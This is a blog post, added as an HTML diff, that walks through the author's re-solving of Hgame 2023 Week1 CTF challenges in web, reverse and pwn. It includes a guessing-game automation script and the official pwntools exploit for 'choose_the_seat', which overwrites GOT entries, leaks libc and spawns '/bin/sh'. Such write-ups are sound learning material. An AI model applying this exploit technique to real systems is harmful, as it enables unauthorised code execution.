@@ -1,0 +1,367 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="当时比赛签了个到就没玩儿了,所以这里新开一篇来复现这次比赛的所有类型,这一篇是记录week1的题型,主要是专精pwn方面的,其他的多多少少都会一点;如果不出意外的话我应该会完整地复现week1-week4的内容,部分其他方向过于困难的题型我也会选择忽略,毕竟不是全栈大佬嘛  09日注:发现这个比赛复现难度太难了,主要是官方之给了一部分web的复现素材,其余的方向复现素材反正我没有找到:( 后面就不">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Vidar Hgame 2023 Week1">
+<meta property="og:url" content="http://example.com/2023/03/08/hgame-vidar-2023-week1/index.html">
+<meta property="og:site_name" content="a0dy&#39;s Home">
+<meta property="og:description" content="当时比赛签了个到就没玩儿了,所以这里新开一篇来复现这次比赛的所有类型,这一篇是记录week1的题型,主要是专精pwn方面的,其他的多多少少都会一点;如果不出意外的话我应该会完整地复现week1-week4的内容,部分其他方向过于困难的题型我也会选择忽略,毕竟不是全栈大佬嘛  09日注:发现这个比赛复现难度太难了,主要是官方之给了一部分web的复现素材,其余的方向复现素材反正我没有找到:( 后面就不">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/pictures/vh2023/web/guesswhoami.png">
+<meta property="article:published_time" content="2023-03-08T06:00:00.000Z">
+<meta property="article:modified_time" content="2023-03-19T09:40:34.666Z">
+<meta property="article:author" content="Andy">
+<meta property="article:tag" content="game">
+<meta property="article:tag" content="personal">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/pictures/vh2023/web/guesswhoami.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>Vidar Hgame 2023 Week1</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">categories</a></li><!--
+     --><!--
+       --><li><a href="/links/">Links</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2023/02/27/pwn-stackpivot/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2023/03/08/hgame-vidar-2023-week1/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2023/03/08/hgame-vidar-2023-week1/&text=Vidar Hgame 2023 Week1"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2023/03/08/hgame-vidar-2023-week1/&title=Vidar Hgame 2023 Week1"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2023/03/08/hgame-vidar-2023-week1/&is_video=false&description=Vidar Hgame 2023 Week1"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Vidar Hgame 2023 Week1&body=Check out this article: http://example.com/2023/03/08/hgame-vidar-2023-week1/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2023/03/08/hgame-vidar-2023-week1/&title=Vidar Hgame 2023 Week1"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2023/03/08/hgame-vidar-2023-week1/&title=Vidar Hgame 2023 Week1"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2023/03/08/hgame-vidar-2023-week1/&title=Vidar Hgame 2023 Week1"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2023/03/08/hgame-vidar-2023-week1/&title=Vidar Hgame 2023 Week1"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2023/03/08/hgame-vidar-2023-week1/&name=Vidar Hgame 2023 Week1&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2023/03/08/hgame-vidar-2023-week1/&t=Vidar Hgame 2023 Week1"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#web"><span class="toc-number">1.</span> <span class="toc-text"> Web</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#classic-childhood-game"><span class="toc-number">1.1.</span> <span class="toc-text"> Classic Childhood Game</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#guess-who-i-am"><span class="toc-number">1.2.</span> <span class="toc-text"> Guess who I am</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#become-a-member"><span class="toc-number">1.3.</span> <span class="toc-text"> Become A Member</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#show-me-your-beauty"><span class="toc-number">1.4.</span> <span class="toc-text"> Show Me Your Beauty</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#reverse"><span class="toc-number">2.</span> <span class="toc-text"> Reverse</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#test_your_idea"><span class="toc-number">2.1.</span> <span class="toc-text"> test_your_idea</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#last"><span class="toc-number">2.2.</span> <span class="toc-text"> Last</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#pwn"><span class="toc-number">3.</span> <span class="toc-text"> PWN</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#test_nc"><span class="toc-number">3.1.</span> <span class="toc-text"> test_nc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#easy_overflow"><span class="toc-number">3.2.</span> <span class="toc-text"> easy_overflow</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#choose_the_seat"><span class="toc-number">3.3.</span> <span class="toc-text"> choose_the_seat</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        Vidar Hgame 2023 Week1
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Andy</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2023-03-08T06:00:00.000Z" itemprop="datePublished">2023-03-08</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/MIX/">MIX</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/game/" rel="tag">game</a>, <a class="tag-link-link" href="/tags/personal/" rel="tag">personal</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>当时比赛签了个到就没玩儿了,所以这里新开一篇来复现这次比赛的所有类型,这一篇是记录week1的题型,主要是专精pwn方面的,其他的多多少少都会一点;如果不出意外的话我应该会完整地复现week1-week4的内容,部分其他方向过于困难的题型我也会选择忽略,毕竟不是全栈大佬嘛</p>
+<blockquote>
+<p>09日注:发现这个比赛复现难度太难了,主要是官方之给了一部分web的复现素材,其余的方向复现素材反正我没有找到:( 后面就不更新了,直接去找wargame玩了</p>
+</blockquote>
+<h1 id="web"><a class="markdownIt-Anchor" href="#web"></a> Web</h1>
+<h2 id="classic-childhood-game"><a class="markdownIt-Anchor" href="#classic-childhood-game"></a> Classic Childhood Game</h2>
+<p>一个经典的魔塔游戏,这游戏以前挺火;可是我的童年是4399和FC游戏机.</p>
+<p>wp给出了三种解法:</p>
+<ul>
+<li>直接控制台运行<code>mota()</code>函数</li>
+<li>断点调试,可以注意到对话时会触发<code>Switch(ID)</code>函数,修改ID为任意对应结局ID即可</li>
+<li>从localStorage修改存档</li>
+</ul>
+<p>这里的第二个方法我用的是firefox不能在调试时修改变量,所以就直接在控制台输入<code>$&#123;var&#125; = value</code>来解决这个问题;第三个方法我这里存档存不了,我对源码进行了全局搜索并没有发现有相关<code>SaveGame()</code>的函数</p>
+<h2 id="guess-who-i-am"><a class="markdownIt-Anchor" href="#guess-who-i-am"></a> Guess who I am</h2>
+<p>这道题复现需要用到Docker,直接在<code>Dcokerfile</code>文件目录运行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker build -t web/whoami .</span><br><span class="line">docker run -d -p 8080:8080 web/whoami</span><br></pre></td></tr></table></figure>
+<p>然后访问<code>localhost:8080</code>就可以正常进入主页<br />
+<img src="/pictures/vh2023/web/guesswhoami.png" alt="home" /></p>
+<p>很明显这是个猜数字的游戏,如果猜错了就会alert弹窗<code>Wrong,Try again</code></p>
+<p>写了半小时脚本发现在他们主页上面的member数据直接get请求是请求不到的,可能是ajax动态绑定的内容?然后我去搜别人的wp发现人家member.json是直接在hint里面给了你</p>
+<p>两种方式:</p>
+<ul>
+<li>直接一个一个ID输进去,输入完就可以拿到flag</li>
+<li>写脚本,自动对比输入</li>
+</ul>
+<p>下面贴上脚本</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://localhost:8080&quot;</span></span><br><span class="line">mem_url=<span class="string">&quot;https://vidar.club/member&quot;</span></span><br><span class="line">json_data=<span class="string">&quot;&quot;</span></span><br><span class="line">cookies=&#123;</span><br><span class="line">        <span class="string">&quot;session&quot;</span>:<span class="string">&quot;MTY3ODI2MTY1MXxEdi1CQkFFQ180SUFBUkFCRUFBQVBQLUNBQUlHYzNSeWFXNW5EQTBBQzJOb1lXeHNaVzVuWlVsa0EybHVkQVFEQVAtQUJuTjBjbWx1Wnd3SUFBWnpiMngyWldRRGFXNTBCQUlBQmc9PXx_2YnMFm_SvPM5CYwDuQ9TZnzhxCb7LP2wLzX7Cah38g====-NX-JRRIW6qPC8nu0xIvMOWvijINXGkJxJQOzS7zodQ==&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getJsonFile</span>():</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;member.json&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                <span class="keyword">global</span> json_data</span><br><span class="line">                json_data=json.load(f)</span><br><span class="line">        <span class="comment">#print(json_data)</span></span><br><span class="line">        </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">matchID</span>():</span><br><span class="line">        session = requests.session()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">                ques = session.get(url=url+<span class="string">&quot;/api/getQuestion&quot;</span>,cookies=cookies)</span><br><span class="line">                message = json.loads(ques.text)[<span class="string">&#x27;message&#x27;</span>]</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;[+]Question Intro: &quot;</span>+message)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">for</span> i <span class="keyword">in</span> json_data:</span><br><span class="line">                        <span class="keyword">if</span> message == i[<span class="string">&#x27;intro&#x27;</span>]:</span><br><span class="line">                                submit_id = &#123;</span><br><span class="line">                                        <span class="string">&quot;id&quot;</span>:i[<span class="string">&#x27;id&#x27;</span>]</span><br><span class="line">                                &#125;</span><br><span class="line">                </span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;[*]Verify Answer: &quot;</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">                verify = session.post(url=url+<span class="string">&quot;/api/verifyAnswer&quot;</span>,cookies=cookies,data=submit_id).text</span><br><span class="line">                verify = json.loads(verify)</span><br><span class="line">                <span class="built_in">print</span>(submit_id)</span><br><span class="line">                <span class="built_in">print</span>(verify)</span><br><span class="line">                <span class="keyword">if</span> verify[<span class="string">&#x27;message&#x27;</span>] == <span class="string">&quot;Correct answer!&quot;</span>:</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">&quot;Verified!&quot;</span>)</span><br><span class="line">                        score = session.get(url+<span class="string">&quot;/api/getScore&quot;</span>,cookies=cookies).text</span><br><span class="line">                        score = json.loads(score)[<span class="string">&#x27;message&#x27;</span>]</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">&quot;==========&quot;</span>,<span class="string">&quot;Current Score:&quot;</span>,score,<span class="string">&quot;==========&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">        getJsonFile()</span><br><span class="line">        matchID()</span><br></pre></td></tr></table></figure>
+<h2 id="become-a-member"><a class="markdownIt-Anchor" href="#become-a-member"></a> Become A Member</h2>
+<p>常规的请求数据构造</p>
+<p>需要构造的有如下:</p>
+<ul>
+<li>User-Agent</li>
+<li>Cookie</li>
+<li>Referer</li>
+<li>XFF</li>
+</ul>
+<h2 id="show-me-your-beauty"><a class="markdownIt-Anchor" href="#show-me-your-beauty"></a> Show Me Your Beauty</h2>
+<p>这两道题都没有给出源码,所以无法复现,内容是简单程度的php一句话木马</p>
+<h1 id="reverse"><a class="markdownIt-Anchor" href="#reverse"></a> Reverse</h1>
+<h2 id="test_your_idea"><a class="markdownIt-Anchor" href="#test_your_idea"></a> test_your_idea</h2>
+<p>这里直接对文件进行反编译就可以看到<code>flag</code>内容,我比较常用的就是Ghidra</p>
+<h2 id="last"><a class="markdownIt-Anchor" href="#last"></a> Last</h2>
+<p>下面就不写了吧,基本上都是需要对具体汇编代码进行分析,由于是复现所以记录下来收益肯定不大,也没有可以提供我们进行复现的材料,所以直接跳过</p>
+<h1 id="pwn"><a class="markdownIt-Anchor" href="#pwn"></a> PWN</h1>
+<h2 id="test_nc"><a class="markdownIt-Anchor" href="#test_nc"></a> test_nc</h2>
+<p>只需要会<code>nc</code>指令连接到远端就行了</p>
+<h2 id="easy_overflow"><a class="markdownIt-Anchor" href="#easy_overflow"></a> easy_overflow</h2>
+<p>这道题我们可以发现main函数里面buf只有16字节的占用大小,但是我们可以输入0x100字节大小的内容,很明显存在栈溢出;并且可以发现有一个名字叫<code>b4ckd0or</code>的函数后门,那么我们的目标就很明确了</p>
+<p>直接构建</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x18的垃圾地址对返回地址进行覆盖,ret对栈空间进行平衡,最后调用后门函数</span><br></pre></td></tr></table></figure>
+<h2 id="choose_the_seat"><a class="markdownIt-Anchor" href="#choose_the_seat"></a> choose_the_seat</h2>
+<p>这道题同样只开启了NX</p>
+<p>可以看到在我们输入座位号的时候没有进行越界检查,所以我们可以通过反向越界从<code>bss</code>表跳转到<code>GOT</code>表来进行覆写</p>
+<p>修改<code>exit</code>为存在漏洞的函数地址这样我们就可以进行漏洞复用</p>
+<p>最后泄漏基址,修改<code>puts</code>为<code>system</code>,输入<code>/bin/sh\x00</code>来执行LCE漏洞</p>
+<p><a target="_blank" rel="noopener" href="http://xn--solve-4h1hu32fyqsqr8agm7d.py">附上官方的solve.py</a></p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&quot;konsole&quot;</span>, <span class="string">&quot;-e&quot;</span>]</span><br><span class="line"><span class="comment"># p = process(&quot;./vuln&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">9999</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./vuln&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.31.so&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;one.&quot;</span>, <span class="string">b&quot;-6&quot;</span>)</span><br><span class="line">p.sendafter(<span class="string">b&quot;name&quot;</span>, p64(elf.sym[<span class="string">&quot;vuln&quot;</span>]))</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;one.&quot;</span>, <span class="string">b&quot;-8&quot;</span>)</span><br><span class="line">p.sendafter(<span class="string">b&quot;name&quot;</span>, <span class="string">b&quot;a&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;is &quot;</span>)</span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">0x08</span>, <span class="string">b&quot;\x00&quot;</span>)) - <span class="number">0x8ba61</span></span><br><span class="line">success(<span class="string">&quot;libc_base = &quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;one.&quot;</span>, <span class="string">b&quot;-9&quot;</span>)</span><br><span class="line">p.sendafter(<span class="string">b&quot;name&quot;</span>, <span class="string">b&quot;/bin/sh\x00&quot;</span> + p64(libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/categories/">categories</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#web"><span class="toc-number">1.</span> <span class="toc-text"> Web</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#classic-childhood-game"><span class="toc-number">1.1.</span> <span class="toc-text"> Classic Childhood Game</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#guess-who-i-am"><span class="toc-number">1.2.</span> <span class="toc-text"> Guess who I am</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#become-a-member"><span class="toc-number">1.3.</span> <span class="toc-text"> Become A Member</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#show-me-your-beauty"><span class="toc-number">1.4.</span> <span class="toc-text"> Show Me Your Beauty</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#reverse"><span class="toc-number">2.</span> <span class="toc-text"> Reverse</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#test_your_idea"><span class="toc-number">2.1.</span> <span class="toc-text"> test_your_idea</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#last"><span class="toc-number">2.2.</span> <span class="toc-text"> Last</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#pwn"><span class="toc-number">3.</span> <span class="toc-text"> PWN</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#test_nc"><span class="toc-number">3.1.</span> <span class="toc-text"> test_nc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#easy_overflow"><span class="toc-number">3.2.</span> <span class="toc-text"> easy_overflow</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#choose_the_seat"><span class="toc-number">3.3.</span> <span class="toc-text"> choose_the_seat</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2023/03/08/hgame-vidar-2023-week1/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2023/03/08/hgame-vidar-2023-week1/&text=Vidar Hgame 2023 Week1"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2023/03/08/hgame-vidar-2023-week1/&title=Vidar Hgame 2023 Week1"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2023/03/08/hgame-vidar-2023-week1/&is_video=false&description=Vidar Hgame 2023 Week1"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Vidar Hgame 2023 Week1&body=Check out this article: http://example.com/2023/03/08/hgame-vidar-2023-week1/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2023/03/08/hgame-vidar-2023-week1/&title=Vidar Hgame 2023 Week1"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2023/03/08/hgame-vidar-2023-week1/&title=Vidar Hgame 2023 Week1"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2023/03/08/hgame-vidar-2023-week1/&title=Vidar Hgame 2023 Week1"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2023/03/08/hgame-vidar-2023-week1/&title=Vidar Hgame 2023 Week1"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2023/03/08/hgame-vidar-2023-week1/&name=Vidar Hgame 2023 Week1&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2023/03/08/hgame-vidar-2023-week1/&t=Vidar Hgame 2023 Week1"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2022-2023
+    Andy
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">categories</a></li><!--
+     --><!--
+       --><li><a href="/links/">Links</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
